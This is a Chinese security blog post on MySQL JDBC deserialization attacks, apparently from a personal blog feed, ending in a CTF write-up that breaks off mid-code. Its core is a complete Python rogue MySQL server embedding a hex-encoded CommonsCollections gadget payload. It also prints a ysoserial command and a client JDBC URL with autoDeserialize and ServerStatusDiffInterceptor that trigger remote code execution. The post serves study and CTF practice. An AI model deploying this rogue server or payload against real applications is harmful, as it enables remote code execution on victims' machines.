    <summary type="html">&lt;h1 id=&quot;RMI-amp-LDAP&quot;&gt;&lt;a href=&quot;#RMI-amp-LDAP&quot; class=&quot;headerlink&quot; title=&quot;RMI &amp;amp; LDAP&quot;&gt;&lt;/a&gt;RMI &amp;amp; LDAP&lt;/h1&gt;&lt;p&gt;这篇文章来总结两个基础知识，&lt;code&gt;rmi&lt;/code&gt;和&lt;code&gt;ldap&lt;/code&gt;，内容比较简单，为后面的&lt;code&gt;jndi&lt;/code&gt;和&lt;code&gt;fastjson&lt;/code&gt;做个铺垫&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之jdbc反序列化</title>
    <link href="https://arsenetang.github.io/2022/03/19/Java%E7%AF%87%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2022/03/19/Java%E7%AF%87%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-03-18T16:00:00.000Z</published>
    <updated>2023-03-22T09:26:56.145Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jdbc反序列化"><a href="#jdbc反序列化" class="headerlink" title="jdbc反序列化"></a>jdbc反序列化</h1><p>这几天有点儿痛苦，看完了p神的<code>Java</code>安全漫谈之后有点儿迷茫，<code>jndi</code>看了看，<code>fastjson</code>看了看，<code>jdbc</code>也看了看，但感觉都看的不太细，很多东西也没搞明白，写文章感觉有点儿难受，所以说一周多都没更了，接下来就慢慢学着慢慢总结着吧，先来看看<code>jdbc</code>反序列化</p><span id="more"></span><h2 id="jdbc是啥"><a href="#jdbc是啥" class="headerlink" title="jdbc是啥"></a>jdbc是啥</h2><p><code>JDBC(Java DataBase Connectivity)</code>，是<code>Java</code>与<code>DataBase</code>之间的桥梁，通俗来说，就是利用<code>Java</code>连接数据库的一种方法；是<code>Java</code>语言中用来规范客户端程序如何访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法，能够执行<code>SQL</code>语言；各种关系型数据库都有相应的方法来实现，但这篇文章我们只针对<code>MYSQL</code>数据库哈</p><h2 id="连接本地数据库"><a href="#连接本地数据库" class="headerlink" title="连接本地数据库"></a>连接本地数据库</h2><p>我们先来看看用<code>Java</code>如何连接本地的数据库，以及如何执行<code>SQL</code>语句</p><p>首先我们需要利用<code>Class.forName()</code>方法来加载<code>JDBC</code>驱动程序(driver)，这个不同的版本是不一样的，比如说新版本中<code>com.mysql.jdbc.Driver</code>就已经被弃用了，我们得用新的驱动<code>com.mysql.cj.jdbc.Driver</code></p><p>然后利用<code>DriverManager</code>中的<code>getConnection</code>方法，通过<code>JDBC url</code>，用户名，密码来连接相应的数据库</p><p>而<code>JDBC url</code>的格式是：<code>jdbc:mysql://host:port/database_name?参数1=value1&amp;参数2=value2...</code></p><p>加入要连接本地的<code>security</code>数据库就是：<code>jdbc:mysql://127.0.0.1:3306/security?serverTimezone=UTC</code>，后面那个参数是为了改变时区</p><p>在获取<code>Connection</code>之后，便可以创建<code>Statement</code>用以执行SQL语句，随便来看个查询<code>select * from users</code>，所以说代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        String jdbc_url = <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/security?serverTimezone=UTC&quot;</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">        Statement stmt = con.createStatement();</span><br><span class="line">        ResultSet rs = stmt.executeQuery(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="string">&quot;id&quot;</span>) + <span class="string">&quot; : &quot;</span> + rs.getString(<span class="string">&quot;username&quot;</span>)+<span class="string">&quot;  &quot;</span>+rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/03/17/omXgt9w2cBJSpvM.png" alt="image.png"></p><h2 id="连接远程数据库"><a href="#连接远程数据库" class="headerlink" title="连接远程数据库"></a>连接远程数据库</h2><p>接下来我们来看看远程的数据库，也就是<code>vps</code>上的<code>MYSQL</code>服务器，连接代码不变，就改改地址就行，主要是这要解决几个配置问题：</p><p>首先是需要打开服务器上的3306端口，在控制台打开就行</p><p>然后就是由于<code>Mysql</code>的安全配置，很可能会拒绝我们的连接请求，我们先来看看服务端Mysql端口的监听情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp | grep 3306</span><br></pre></td></tr></table></figure><p>看看<code>Local Address</code>，只有<code>127.0.0.1:3306</code>的话，说明<code>Mysql</code>服务端仅监听来自本机3306端口上的数据库请求，这样肯定是不行的</p><p>所以说，我们得先进到mysql目录下，我的是<code>/etc/mysql</code>，搜索哪里有绑定127.0.0.1的网址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -nr &quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure><p>然后进到该文件中，将<code>bind-address</code>那一行注释掉就好了，然后重启mysql服务，再查看一下3306端口的监听情况以确定修改成功与否</p><p><img src="https://s2.loli.net/2022/03/17/aYnOeP97GlHAykM.png" alt="image.png"></p><p>这样子就好了，远程就能连上了</p><p><img src="https://s2.loli.net/2022/03/17/6cxfhlikoad1LmS.png" alt="image.png"></p><p>如果还有啥问题，请参考：<a href="https://www.cnblogs.com/chorm590/p/9968475.html">https://www.cnblogs.com/chorm590/p/9968475.html</a></p><h2 id="jdbc反序列化原理"><a href="#jdbc反序列化原理" class="headerlink" title="jdbc反序列化原理"></a>jdbc反序列化原理</h2><p>既然我们可以通过<code>Java</code>连接数据库了，那么假如<code>JDBC url</code>可控，我们就可以让它连接任意<code>Mysql</code>服务器了，如果服务器中再存在反序列化漏洞，我们就可以设置一个恶意的<code>Mysql</code>服务器，通过<code>ObjectInputStream.readObject()</code>的反序列化攻击从而RCE</p><p>就是说咱通过<code>JDBC</code>连接数据库的时候，会有几个内置的<code>SQL</code>语句会被执行，而其中两个查询的结果集在<code>MySQL</code>客户端被处理时会调用<code>ObjectInputStream.readObject()</code>进行反序列化操作，如果攻击者搭建恶意<code>MySQL</code>服务器来控制这两个查询的结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC客户端反序列化漏洞</p><p>而这个内置的<code>SQL</code>语句就是：<code>SHOW SESSION STATUS</code>和<code>SHOW COLLATION</code></p><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>那我们先本地测一测，首先在<code>vps</code>上起一个恶意<code>Mysql</code>服务器，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_data</span>(<span class="params">conn</span>):</span></span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span>(<span class="params">conn,data</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload_content</span>():</span></span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>然后我们是用cc链来测试的，客户端肯定要有cc依赖哈，然后利用<code>ysoserial</code>来生成cc7的<code>payload</code>，放到<code>payload</code>文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar yso*.jar CommonsCollections7 calc &gt; payload</span><br></pre></td></tr></table></figure><p>然后运行这个py文件，开始监听：</p><p><img src="https://s2.loli.net/2022/03/19/izLMIPD95Ydnlom.png" alt="image.png"></p><p>接下来就来写客户端的代码，很简单，先放代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        String jdbc_url = <span class="string">&quot;jdbc:mysql://xx.xx.xx.xxx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是看这两个参数<code>?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></p><p>第一个参数<code>autoDeserialize</code>是用来自动检测与反序列化存在BLOB字段中的对象，为了满足下面的条件，这其实挺简单，记得加上就行</p><p>第二个参数就稍微有点儿复杂了，<code>ServerStatusDiffInterceptor</code>是一个拦截器，当我们在<code>JDBC url</code>中设置属性<code>queryInterceptors</code>为<code>ServerStatusDiffInterceptor</code>时，在执行<code>SQL</code>的查询语句的时候，会调用拦截器的<code>postProcess</code>方法，然后调用<code>populateMapWithSessionStatusValues</code>方法，然后调用<code>resultSetToMap</code>方法，然后调用<code>getObject</code>方法，在<code>getObject</code>中，只要<code>autoDeserialize</code> 为True，就可以进入到最后<code>readObject</code>中，最终实现反序列化；而我们前面说到了，当通过<code>JDBC</code>连接数据库的时候，会有几个内置的<code>SQL</code>语句会被执行，所以说这样就通了，而这就是这两个参数的由来，调用链不算很难，我也就不放代码了，给一篇参考文章：<a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p>运行客户端代码，弹出计算器</p><h2 id="例题解析-—-羊城杯-2020-A-Piece-Of-Java"><a href="#例题解析-—-羊城杯-2020-A-Piece-Of-Java" class="headerlink" title="例题解析 — [羊城杯 2020]A Piece Of Java"></a>例题解析 — [羊城杯 2020]A Piece Of Java</h2><p>这是我人生中做出的第一道CTF的<code>Java</code>题，还挺有纪念意义的哈哈哈，buu上就能复现</p><p>这道题给出了源码，放<code>idea</code>中先审审源码：</p><p>在入口中看到了<code>/hello</code>下面有一个<code>deserialize</code>，而且它反序列化的是<code>Cookie</code>中的<code>data</code>字段的值，我们是可控的，看看<code>deserialize</code></p><p>看到了硕大的一个<code>readObject()</code>，而且它是先<code>base64</code>解码之后再进行的<code>readObject()</code></p><p>然后我们去看<code>InfoInvocationHandler</code>类，听这个名字就感觉大概是动态代理类，而且里面实现了<code>InvocationHandler</code>和<code>Serializable</code>俩接口，只重写了<code>invoke</code>方法，肯定是个动态代理类，那么通过调用<code>invoke</code>方法，在<code>invoke</code>方法里面调用了<code>checkAllInfo()</code>方法，那么只要我们让<code>this.info</code>是一个<code>DatabaseInfo</code>对象，就可以调用<code>DatabaseInfo</code>对象的<code>checkAllInfo</code>方法了，然后在里面调用了<code>this.connect()</code>方法，连接数据库了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseInfo</span> <span class="keyword">implements</span> <span class="title">Serializable</span>, <span class="title">Info</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String host;</span><br><span class="line">    <span class="keyword">private</span> String port;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Connection connection;</span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://&quot;</span> + <span class="keyword">this</span>.host + <span class="string">&quot;:&quot;</span> + <span class="keyword">this</span>.port + <span class="string">&quot;/jdbc?user=&quot;</span> + <span class="keyword">this</span>.username + <span class="string">&quot;&amp;password=&quot;</span> + <span class="keyword">this</span>.password + <span class="string">&quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.connection = DriverManager.getConnection(url);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">checkAllInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.host != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.port != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.username != <span 